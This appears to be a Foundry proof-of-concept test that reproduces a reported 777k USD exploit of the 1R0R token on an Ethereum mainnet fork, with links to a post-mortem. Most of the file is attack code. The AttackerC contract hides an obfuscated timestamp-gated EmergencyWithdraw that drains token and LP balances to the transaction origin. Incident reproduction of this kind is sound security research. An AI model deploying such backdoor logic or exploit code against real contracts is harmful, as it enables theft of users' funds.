pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 777k USD
// Attacker : 0x8149f77504007450711023cf0ec11bdd6348401f
// Attack Contract : 
// Vulnerable Contract : 
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0xab2097bb3ce666493d0f76179f7206926adc8cec4ba16e88aed30c202d70c661

// @Info
// Vulnerable Contract Code : 

// @Analysis
// Post-mortem : https://x.com/CertiKAlert/status/1912430535999189042
// Twitter Guy : https://x.com/CertiKAlert/status/1912430535999189042
// Hacking God : N/A

address constant ONE_R0AR_Token = 0xb0415D55f2C87b7f99285848bd341C367FeAc1ea;
address constant UniswapV2Pair = 0x13028E6b95520ad16898396667d1e52cB5E550Ac;
address constant attacker = 0x8149f77504007450711023cf0eC11BDd6348401F;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 22278564);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", IERC20(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea).balanceOf(attacker), 18);
        emit log_named_decimal_uint("before attack: balance of attacker", IERC20(0x13028E6b95520ad16898396667d1e52cB5E550Ac).balanceOf(attacker), 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        deal(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea, address(attC), 100000000099978913875247186);
        deal(0x13028E6b95520ad16898396667d1e52cB5E550Ac, address(attC), 26777446973800063826);
        attC.EmergencyWithdraw();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", IERC20(0xb0415D55f2C87b7f99285848bd341C367FeAc1ea).balanceOf(attacker), 18);
        emit log_named_decimal_uint("after attack: balance of attacker", IERC20(0x13028E6b95520ad16898396667d1e52cB5E550Ac).balanceOf(attacker), 18);
    }
}

contract AttackerC {
    uint256 constant T0 = 0x67ff15af;
    uint256 constant BIGC = 0x25aaa441b6cac9c2f49d8d012ccc517de4215e056b0f63883f8240c8e228fed1;
    uint256 constant DEN = 365000 * 24 * 3600;
    uint256 constant K = 35;
    uint256 constant OFF = 61066966765;

    function EmergencyWithdraw() public {
        if (block.timestamp >= T0) {
            uint256 rate = BIGC / DEN;
            if ((((block.timestamp * rate * K) - (OFF * rate)) / (rate * K)) == (block.timestamp - T0)) {
                uint256 bal1 = IONE_R0AR_Token(ONE_R0AR_Token).balanceOf(address(this));
                uint256 diff = (block.timestamp * rate * K) - (OFF * rate);
                if (diff > 0) {
                    if (bal1 < diff) {
                        bytes memory data1 = abi.encodeWithSelector(
                            IONE_R0AR_Token.transfer.selector,
                            tx.origin,
                            100000000099978910611013632
                        );
                        (bool ok1, bytes memory ret1) = ONE_R0AR_Token.call(data1);
                        require(ok1 && (ret1.length == 0 || abi.decode(ret1, (bool))), "transfer1 failed");

                        IERC20(UniswapV2Pair).balanceOf(address(this));
                        bytes memory data2 = abi.encodeWithSelector(
                            IERC20.transfer.selector,
                            tx.origin,
                            26777446972437561344
                        );
                        (bool ok2, bytes memory ret2) = UniswapV2Pair.call(data2);
                        require(ok2 && (ret2.length == 0 || abi.decode(ret2, (bool))), "transfer2 failed");
                    }
                }
            }
        }
    }
}

interface IONE_R0AR_Token {
	function transfer(address, uint256) external returns (bool);
	function balanceOf(address) external returns (uint256); 
}